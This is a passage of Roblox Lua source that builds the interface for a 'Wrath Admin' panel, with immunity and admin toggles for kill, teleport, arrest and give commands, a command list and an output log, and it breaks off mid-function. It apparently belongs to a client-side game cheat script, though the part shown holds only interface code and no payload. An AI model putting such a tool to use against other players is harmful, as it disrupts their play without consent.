MainGuiObjects.Toggle_7.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_7.Font = Enum.Font.Code
MainGuiObjects.Toggle_7.Text = " Kill Commands"
MainGuiObjects.Toggle_7.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_7.TextSize = 14.000
MainGuiObjects.Toggle_7.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_7.MouseButton1Click:Connect(function()
    ProtectedSettings.killcmds = not ProtectedSettings.killcmds;
    ChangeImmunityToggle(ProtectedSettings.killcmds, "Kill Commands");
end);

MainGuiObjects.UICorner_20.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_20.Parent = MainGuiObjects.Toggle_7

MainGuiObjects.TextLabel_10.Parent = MainGuiObjects.Toggle_7
MainGuiObjects.TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_10.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_10.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_10.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_10.Font = Enum.Font.Code
MainGuiObjects.TextLabel_10.Text = "true"
MainGuiObjects.TextLabel_10.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_10.TextSize = 14.000

MainGuiObjects.Toggle_8.Name = "Toggle"
MainGuiObjects.Toggle_8.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_8.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_8.BorderSizePixel = 0
MainGuiObjects.Toggle_8.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_8.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_8.Font = Enum.Font.Code
MainGuiObjects.Toggle_8.Text = " Teleport Commands"
MainGuiObjects.Toggle_8.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_8.TextSize = 14.000
MainGuiObjects.Toggle_8.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_8.MouseButton1Click:Connect(function()
    ProtectedSettings.tpcmds = not ProtectedSettings.tpcmds;
    ChangeImmunityToggle(ProtectedSettings.tpcmds, "Teleport Commands");
end);

MainGuiObjects.UICorner_21.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_21.Parent = MainGuiObjects.Toggle_8

MainGuiObjects.TextLabel_11.Parent = MainGuiObjects.Toggle_8
MainGuiObjects.TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_11.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_11.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_11.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_11.Font = Enum.Font.Code
MainGuiObjects.TextLabel_11.Text = "true"
MainGuiObjects.TextLabel_11.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_11.TextSize = 14.000

MainGuiObjects.Toggle_9.Name = "Toggle"
MainGuiObjects.Toggle_9.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_9.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_9.BorderSizePixel = 0
MainGuiObjects.Toggle_9.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_9.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_9.Font = Enum.Font.Code
MainGuiObjects.Toggle_9.Text = " Arrest Commands"
MainGuiObjects.Toggle_9.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_9.TextSize = 14.000
MainGuiObjects.Toggle_9.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_9.MouseButton1Click:Connect(function()
    ProtectedSettings.arrestcmds = not ProtectedSettings.arrestcmds;
    ChangeImmunityToggle(ProtectedSettings.arrestcmds, "Arrest Commands");
end);

MainGuiObjects.UICorner_22.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_22.Parent = MainGuiObjects.Toggle_9

MainGuiObjects.TextLabel_12.Parent = MainGuiObjects.Toggle_9
MainGuiObjects.TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_12.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_12.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_12.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_12.Font = Enum.Font.Code
MainGuiObjects.TextLabel_12.Text = "true"
MainGuiObjects.TextLabel_12.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_12.TextSize = 14.000

MainGuiObjects.Toggle_10.Name = "Toggle"
MainGuiObjects.Toggle_10.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_10.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_10.BorderSizePixel = 0
MainGuiObjects.Toggle_10.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_10.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_10.Font = Enum.Font.Code
MainGuiObjects.Toggle_10.Text = " Give Commands"
MainGuiObjects.Toggle_10.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_10.TextSize = 14.000
MainGuiObjects.Toggle_10.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_10.MouseButton1Click:Connect(function()
    ProtectedSettings.givecmds = not ProtectedSettings.givecmds;
    ChangeImmunityToggle(ProtectedSettings.givecmds, "Give Commands");
end);

MainGuiObjects.UICorner_23.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_23.Parent = MainGuiObjects.Toggle_10

MainGuiObjects.TextLabel_13.Parent = MainGuiObjects.Toggle_10
MainGuiObjects.TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_13.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_13.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_13.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_13.Font = Enum.Font.Code
MainGuiObjects.TextLabel_13.Text = "true"
MainGuiObjects.TextLabel_13.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_13.TextSize = 14.000

MainGuiObjects.Toggle_11.Name = "Toggle"
MainGuiObjects.Toggle_11.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_11.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_11.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_11.BorderSizePixel = 0
MainGuiObjects.Toggle_11.Position = UDim2.new(-0.00444444455, 0, 0.00902553741, 0)
MainGuiObjects.Toggle_11.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_11.Font = Enum.Font.Code
MainGuiObjects.Toggle_11.Text = " Other Commands"
MainGuiObjects.Toggle_11.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_11.TextSize = 14.000
MainGuiObjects.Toggle_11.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_11.MouseButton1Click:Connect(function()
    ProtectedSettings.othercmds = not ProtectedSettings.othercmds;
    ChangeImmunityToggle(ProtectedSettings.othercmds, "Other Commands");
end);

MainGuiObjects.UICorner_24.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_24.Parent = MainGuiObjects.Toggle_11


MainGuiObjects.TextLabel_14.Parent = MainGuiObjects.Toggle_11
MainGuiObjects.TextLabel_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_14.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_14.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_14.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_14.Font = Enum.Font.Code
MainGuiObjects.TextLabel_14.Text = "true"
MainGuiObjects.TextLabel_14.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_14.TextSize = 14.000

MainGuiObjects.UICorner_25.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_25.Parent = MainGuiObjects.Toggle_12


MainGuiObjects.AdminSettings.Name = "AdminSettings"
MainGuiObjects.AdminSettings.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.AdminSettings.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.AdminSettings.BorderSizePixel = 0
MainGuiObjects.AdminSettings.Position = UDim2.new(0.280947179, 81, 0.336463153, -171)
MainGuiObjects.AdminSettings.Size = UDim2.new(0, 242, 0, 201)
makeDraggable(MainGuiObjects.AdminSettings);

function ChangeAdminGuiToggle(State, Name)
    for i,v in pairs(MainGuiObjects.AdminListFrame:GetChildren()) do
        if v:IsA("TextButton") then
            if v.Text == " " .. Name then
                if State then
                    v:FindFirstChildWhichIsA("TextLabel").Text = "true";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(85, 255, 0)
                else
                    v:FindFirstChildWhichIsA("TextLabel").Text = "false";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(255, 0, 0);
                end;
            end;
        end;
    end;
end;

MainGuiObjects.AdminTopbar.Name = "AdminTopbar"
MainGuiObjects.AdminTopbar.Parent = MainGuiObjects.AdminSettings
MainGuiObjects.AdminTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.AdminTopbar.BorderSizePixel = 0
MainGuiObjects.AdminTopbar.Size = UDim2.new(0, 242, 0, 31)


MainGuiObjects.TemplateTopbarRound_5.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_5.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_5.Parent = MainGuiObjects.AdminTopbar


MainGuiObjects.TogglesTitle_3.Name = "TogglesTitle"
MainGuiObjects.TogglesTitle_3.Parent = MainGuiObjects.AdminTopbar
MainGuiObjects.TogglesTitle_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_3.BackgroundTransparency = 1.000
MainGuiObjects.TogglesTitle_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TogglesTitle_3.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TogglesTitle_3.Font = Enum.Font.Code
MainGuiObjects.TogglesTitle_3.Text = "Admin Settings"
MainGuiObjects.TogglesTitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_3.TextSize = 24.000


MainGuiObjects.PlayerListRound_6.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_6.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_6.Parent = MainGuiObjects.AdminSettings


MainGuiObjects.AdminListFrame.Name = "AdminListFrame"
MainGuiObjects.AdminListFrame.Parent = MainGuiObjects.AdminSettings
MainGuiObjects.AdminListFrame.Active = true
MainGuiObjects.AdminListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.AdminListFrame.BorderSizePixel = 0
MainGuiObjects.AdminListFrame.Position = UDim2.new(0.0330578499, 0, 0.209551603, 0)
MainGuiObjects.AdminListFrame.Size = UDim2.new(0, 225, 0, 150)
MainGuiObjects.AdminListFrame.ScrollBarThickness = 1


MainGuiObjects.UIListLayout_6.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_6.Padding = UDim.new(0, 5)


MainGuiObjects.Toggle_13.Name = "Toggle"
MainGuiObjects.Toggle_13.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_13.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_13.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_13.BorderSizePixel = 0
MainGuiObjects.Toggle_13.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_13.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_13.Font = Enum.Font.Code
MainGuiObjects.Toggle_13.Text = " Kill Commands"
MainGuiObjects.Toggle_13.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_13.TextSize = 14.000
MainGuiObjects.Toggle_13.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_13.MouseButton1Click:Connect(function()
    AdminSettings.killcmds = not AdminSettings.killcmds;
    ChangeAdminGuiToggle(AdminSettings.killcmds, "Kill Commands");
end);

MainGuiObjects.UICorner_26.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_26.Parent = MainGuiObjects.Toggle_13


MainGuiObjects.TextLabel_16.Parent = MainGuiObjects.Toggle_13
MainGuiObjects.TextLabel_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_16.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_16.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_16.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_16.Font = Enum.Font.Code
MainGuiObjects.TextLabel_16.Text = "true"
MainGuiObjects.TextLabel_16.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_16.TextSize = 14.000


MainGuiObjects.Toggle_14.Name = "Toggle"
MainGuiObjects.Toggle_14.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_14.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_14.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_14.BorderSizePixel = 0
MainGuiObjects.Toggle_14.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_14.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_14.Font = Enum.Font.Code
MainGuiObjects.Toggle_14.Text = " Teleport Commands"
MainGuiObjects.Toggle_14.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_14.TextSize = 14.000
MainGuiObjects.Toggle_14.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_14.MouseButton1Click:Connect(function()
    AdminSettings.tpcmds = not AdminSettings.tpcmds;
    ChangeAdminGuiToggle(AdminSettings.tpcmds, "Teleport Commands");
end);

MainGuiObjects.UICorner_27.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_27.Parent = MainGuiObjects.Toggle_14


MainGuiObjects.TextLabel_17.Parent = MainGuiObjects.Toggle_14
MainGuiObjects.TextLabel_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_17.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_17.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_17.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_17.Font = Enum.Font.Code
MainGuiObjects.TextLabel_17.Text = "true"
MainGuiObjects.TextLabel_17.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_17.TextSize = 14.000


MainGuiObjects.Toggle_15.Name = "Toggle"
MainGuiObjects.Toggle_15.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_15.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_15.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_15.BorderSizePixel = 0
MainGuiObjects.Toggle_15.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_15.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_15.Font = Enum.Font.Code
MainGuiObjects.Toggle_15.Text = " Arrest Commands"
MainGuiObjects.Toggle_15.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_15.TextSize = 14.000
MainGuiObjects.Toggle_15.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_15.MouseButton1Click:Connect(function()
    AdminSettings.arrestcmds = not AdminSettings.arrestcmds;
    ChangeAdminGuiToggle(AdminSettings.arrestcmds, "Arrest Commands");
end);

MainGuiObjects.UICorner_28.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_28.Parent = MainGuiObjects.Toggle_15


MainGuiObjects.TextLabel_18.Parent = MainGuiObjects.Toggle_15
MainGuiObjects.TextLabel_18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_18.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_18.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_18.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_18.Font = Enum.Font.Code
MainGuiObjects.TextLabel_18.Text = "true"
MainGuiObjects.TextLabel_18.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_18.TextSize = 14.000


MainGuiObjects.Toggle_16.Name = "Toggle"
MainGuiObjects.Toggle_16.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_16.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_16.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_16.BorderSizePixel = 0
MainGuiObjects.Toggle_16.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_16.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_16.Font = Enum.Font.Code
MainGuiObjects.Toggle_16.Text = " Give Commands"
MainGuiObjects.Toggle_16.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_16.TextSize = 14.000
MainGuiObjects.Toggle_16.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_16.MouseButton1Click:Connect(function()
    AdminSettings.givecmds = not AdminSettings.givecmds;
    ChangeAdminGuiToggle(AdminSettings.givecmds, "Give Commands");
end);

MainGuiObjects.UICorner_29.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_29.Parent = MainGuiObjects.Toggle_16


MainGuiObjects.TextLabel_19.Parent = MainGuiObjects.Toggle_16
MainGuiObjects.TextLabel_19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_19.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_19.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_19.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_19.Font = Enum.Font.Code
MainGuiObjects.TextLabel_19.Text = "true"
MainGuiObjects.TextLabel_19.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_19.TextSize = 14.000


MainGuiObjects.Toggle_17.Name = "Toggle"
MainGuiObjects.Toggle_17.Parent = MainGuiObjects.AdminListFrame
MainGuiObjects.Toggle_17.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_17.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_17.BorderSizePixel = 0
MainGuiObjects.Toggle_17.Position = UDim2.new(-0.00444444455, 0, 0.00902553741, 0)
MainGuiObjects.Toggle_17.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_17.Font = Enum.Font.Code
MainGuiObjects.Toggle_17.Text = " Other Commands"
MainGuiObjects.Toggle_17.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_17.TextSize = 14.000
MainGuiObjects.Toggle_17.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_17.MouseButton1Click:Connect(function()
    AdminSettings.othercmds = not AdminSettings.othercmds;
    ChangeAdminGuiToggle(AdminSettings.othercmds, "Other Commands");
end);

MainGuiObjects.UICorner_30.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_30.Parent = MainGuiObjects.Toggle_17


MainGuiObjects.TextLabel_20.Parent = MainGuiObjects.Toggle_17
MainGuiObjects.TextLabel_20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_20.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_20.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_20.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_20.Font = Enum.Font.Code
MainGuiObjects.TextLabel_20.Text = "true"
MainGuiObjects.TextLabel_20.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_20.TextSize = 14.000


MainGuiObjects.Commands.Name = "Commands"
MainGuiObjects.Commands.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.Commands.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.Commands.BorderSizePixel = 0
MainGuiObjects.Commands.Position = UDim2.new(0.0118406396, 0, 0.549295723, 0)
MainGuiObjects.Commands.Size = UDim2.new(0, 242, 0, 276)

makeDraggable(MainGuiObjects.Commands);

MainGuiObjects.CommandsTopbar.Name = "CommandsTopbar"
MainGuiObjects.CommandsTopbar.Parent = MainGuiObjects.Commands
MainGuiObjects.CommandsTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.CommandsTopbar.BorderSizePixel = 0
MainGuiObjects.CommandsTopbar.Size = UDim2.new(0, 242, 0, 31)


MainGuiObjects.TemplateTopbarRound_6.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_6.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_6.Parent = MainGuiObjects.CommandsTopbar


MainGuiObjects.TogglesTitle_4.Name = "TogglesTitle"
MainGuiObjects.TogglesTitle_4.Parent = MainGuiObjects.CommandsTopbar
MainGuiObjects.TogglesTitle_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_4.BackgroundTransparency = 1.000
MainGuiObjects.TogglesTitle_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TogglesTitle_4.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TogglesTitle_4.Font = Enum.Font.Code
MainGuiObjects.TogglesTitle_4.Text = "Commands"
MainGuiObjects.TogglesTitle_4.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_4.TextSize = 31.000


MainGuiObjects.PlayerListRound_7.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_7.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_7.Parent = MainGuiObjects.Commands


MainGuiObjects.CommandsListFrame.Name = "CommandsListFrame"
MainGuiObjects.CommandsListFrame.Parent = MainGuiObjects.Commands
MainGuiObjects.CommandsListFrame.Active = true
MainGuiObjects.CommandsListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.CommandsListFrame.BorderSizePixel = 0
MainGuiObjects.CommandsListFrame.Position = UDim2.new(0.0371900834, 0, 0.160976127, 0)
MainGuiObjects.CommandsListFrame.Size = UDim2.new(0, 225, 0, 221)
MainGuiObjects.CommandsListFrame.ScrollBarThickness = 1

function NewCommand(Text)
    local Command = Instance.new("TextButton");
    Command.Name = "Command"
    Command.Parent = MainGuiObjects.CommandsListFrame
    Command.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
    Command.BorderColor3 = Color3.fromRGB(27, 42, 53)
    Command.BorderSizePixel = 0
    Command.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
    Command.Size = UDim2.new(0, 225, 0, 35)
    Command.Font = Enum.Font.Code
    Command.Text = Text
    Command.TextColor3 = Color3.fromRGB(255, 255, 255)
    Command.TextSize = 14.000
    Command.RichText = true
    Command.TextWrapped = true

    local Corner = Instance.new("UICorner");
    Corner.CornerRadius = UDim.new(0, 5)
    Corner.Parent = Command;

    task.spawn(function()
        task.wait(1/20)
        local textSizeY = Command.TextBounds.Y
        Command.Size = UDim2.new(0, 225, 0, textSizeY + 10)
        MainGuiObjects.CommandsListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_7.AbsoluteContentSize.Y)
    end);
end;

for i,v in next, Commands do
    local Split = v:split(" -- ")
    if Split[2] then
        NewCommand(Split[1] .. "\n--\n" .. Split[2])
    else
        NewCommand(v);
    end;
end;

MainGuiObjects.UIListLayout_7.Parent = MainGuiObjects.CommandsListFrame
MainGuiObjects.UIListLayout_7.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_7.Padding = UDim.new(0, 5)

MainGuiObjects.Output.Name = "Output"
MainGuiObjects.Output.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.Output.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.Output.BorderSizePixel = 0
MainGuiObjects.Output.Position = UDim2.new(0.490850389, -736, 0.0625978187, 231)
MainGuiObjects.Output.Size = UDim2.new(0, 242, 0, 164)
makeDraggable(MainGuiObjects.Output)

MainGuiObjects.TemplateTopbar_3.Name = "TemplateTopbar"
MainGuiObjects.TemplateTopbar_3.Parent = MainGuiObjects.Output
MainGuiObjects.TemplateTopbar_3.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TemplateTopbar_3.BorderSizePixel = 0
MainGuiObjects.TemplateTopbar_3.Size = UDim2.new(0, 242, 0, 31)


MainGuiObjects.TemplateTopbarRound_7.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_7.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_7.Parent = MainGuiObjects.TemplateTopbar_3


MainGuiObjects.TemplateTitle_3.Name = "TemplateTitle"
MainGuiObjects.TemplateTitle_3.Parent = MainGuiObjects.TemplateTopbar_3
MainGuiObjects.TemplateTitle_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle_3.BackgroundTransparency = 1.000
MainGuiObjects.TemplateTitle_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TemplateTitle_3.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TemplateTitle_3.Font = Enum.Font.Code
MainGuiObjects.TemplateTitle_3.Text = "Output"
MainGuiObjects.TemplateTitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TemplateTitle_3.TextSize = 31.000


MainGuiObjects.PlayerListRound_8.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_8.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_8.Parent = MainGuiObjects.Output


MainGuiObjects.OutputListFrame.Name = "OutputListFrame"
MainGuiObjects.OutputListFrame.Parent = MainGuiObjects.Output
MainGuiObjects.OutputListFrame.Active = true
MainGuiObjects.OutputListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.OutputListFrame.BorderSizePixel = 0
MainGuiObjects.OutputListFrame.Position = UDim2.new(0.0252201017, 0, 0.248236686, 0)
MainGuiObjects.OutputListFrame.Size = UDim2.new(0, 225, 0, 114)
MainGuiObjects.OutputListFrame.ScrollBarThickness = 5

MainGuiObjects.UIListLayout_8.Parent = MainGuiObjects.OutputListFrame
MainGuiObjects.UIListLayout_8.HorizontalAlignment = Enum.HorizontalAlignment.Left
MainGuiObjects.UIListLayout_8.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_8.Padding = UDim.new(0, 5)

function AddLog(Type, Text)
    local Log = Instance.new("TextButton");
    Log.Name = "Log"
    Log.Parent = MainGuiObjects.OutputListFrame
    Log.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
    Log.BorderColor3 = Color3.fromRGB(27, 42, 53)
    Log.BorderSizePixel = 0
    Log.AutoButtonColor = false
    Log.Font = Enum.Font.Code
    Log.Text = "[" .. Type:upper() .. "] " .. Text;
    if Type:lower() == "success" then
        Log.TextColor3 = Color3.fromRGB(0, 255, 0)
    elseif Type:lower() == "error" then
        Log.TextColor3 = Color3.fromRGB(255, 0, 0)
    else
        Log.TextColor3 = Color3.fromRGB(0, 0, 255)
    end;
    Log.RichText = true;
    Log.TextSize = 14.000
    Log.TextWrapped = true
    Log.Size = UDim2.new(0, 225, 0, 25);
    Log.TextXAlignment = Enum.TextXAlignment.Left

    local Corner = Instance.new("UICorner");
    Corner.CornerRadius = UDim.new(0, 5);
    Corner.Parent = Log;

    MainGuiObjects.OutputListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_8.AbsoluteContentSize.Y);
    MainGuiObjects.OutputListFrame.CanvasPosition = Vector2.new(0, MainGuiObjects.UIListLayout_8.AbsoluteContentSize.Y);
end;

MainGuiObjects.UICorner_32.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_32.Parent = MainGuiObjects.Log

MainGuiObjects.OutputListFrame.ChildAdded:Connect(function(Log)
    if Log:IsA("TextButton") then
        task.wait(1/20);
